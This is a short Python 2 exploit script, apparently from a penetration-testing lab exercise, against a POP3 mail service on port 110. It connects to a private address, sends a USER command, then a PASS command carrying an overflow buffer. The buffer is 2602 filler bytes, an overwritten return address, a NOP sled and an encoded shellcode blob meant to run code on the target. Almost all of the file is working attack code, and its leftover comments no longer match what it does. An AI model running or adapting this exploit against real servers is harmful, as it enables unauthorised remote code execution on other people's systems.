#!/usr/bin/python
#
#
#Test One to confirm the Crash of the Application
#
#Imports
import socket

# Send 2700 A's
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

shellcode = (
    "" +
    "\xbb\x98\x9b\x07\xdd\xdb\xc7\xd9\x74\x24\xf4\x58\x29" +
    "\xc9\xb1\x52\x83\xe8\xfc\x31\x58\x0e\x03\xc0\x95\xe5" +
    "\x28\x0c\x41\x6b\xd2\xec\x92\x0c\x5a\x09\xa3\x0c\x38" +
    "\x5a\x94\xbc\x4a\x0e\x19\x36\x1e\xba\xaa\x3a\xb7\xcd" +
    "\x1b\xf0\xe1\xe0\x9c\xa9\xd2\x63\x1f\xb0\x06\x43\x1e" +
    "\x7b\x5b\x82\x67\x66\x96\xd6\x30\xec\x05\xc6\x35\xb8" +
    "\x95\x6d\x05\x2c\x9e\x92\xde\x4f\x8f\x05\x54\x16\x0f" +
    "\xa4\xb9\x22\x06\xbe\xde\x0f\xd0\x35\x14\xfb\xe3\x9f" +
    "\x64\x04\x4f\xde\x48\xf7\x91\x27\x6e\xe8\xe7\x51\x8c" +
    "\x95\xff\xa6\xee\x41\x75\x3c\x48\x01\x2d\x98\x68\xc6" +
    "\xa8\x6b\x66\xa3\xbf\x33\x6b\x32\x13\x48\x97\xbf\x92" +
    "\x9e\x11\xfb\xb0\x3a\x79\x5f\xd8\x1b\x27\x0e\xe5\x7b" +
    "\x88\xef\x43\xf0\x25\xfb\xf9\x5b\x22\xc8\x33\x63\xb2" +
    "\x46\x43\x10\x80\xc9\xff\xbe\xa8\x82\xd9\x39\xce\xb8" +
    "\x9e\xd5\x31\x43\xdf\xfc\xf5\x17\x8f\x96\xdc\x17\x44" +
    "\x66\xe0\xcd\xcb\x36\x4e\xbe\xab\xe6\x2e\x6e\x44\xec" +
    "\xa0\x51\x74\x0f\x6b\xfa\x1f\xea\xfc\xc5\x48\xf4\x98" +
    "\xad\x8a\xf4\x71\x72\x02\x12\x1b\x9a\x42\x8d\xb4\x03" +
    "\xcf\x45\x24\xcb\xc5\x20\x66\x47\xea\xd5\x29\xa0\x87" +
    "\xc5\xde\x40\xd2\xb7\x49\x5e\xc8\xdf\x16\xcd\x97\x1f" +
    "\x50\xee\x0f\x48\x35\xc0\x59\x1c\xab\x7b\xf0\x02\x36" +
    "\x1d\x3b\x86\xed\xde\xc2\x07\x63\x5a\xe1\x17\xbd\x63" +
    "\xad\x43\x11\x32\x7b\x3d\xd7\xec\xcd\x97\x81\x43\x84" +
    "\x7f\x57\xa8\x17\xf9\x58\xe5\xe1\xe5\xe9\x50\xb4\x1a" +
    "\xc5\x34\x30\x63\x3b\xa5\xbf\xbe\xff\xd5\xf5\xe2\x56" +
    "\x7e\x50\x77\xeb\xe3\x63\xa2\x28\x1a\xe0\x46\xd1\xd9" +
    "\xf8\x23\xd4\xa6\xbe\xd8\xa4\xb7\x2a\xde\x1b\xb7\x7e"
)


buffer = "A" * 2602 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
#buffer = "\x41" * 2602 + "\x42\x42\x42\x42" + shellcode    
#buffer = "\x41" * 2602 + "\x42\x42\x42\x42" + (3500 - 4 - 2602) * "\x43"


try:
    print "\n Sending evil buffer"
    s.connect(('192.168.0.50',110))
    data = s.recv(1024)
    s.send('USER test' + '\r\n')
    data = s.recv(1024)
    s.send('PASS  ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"


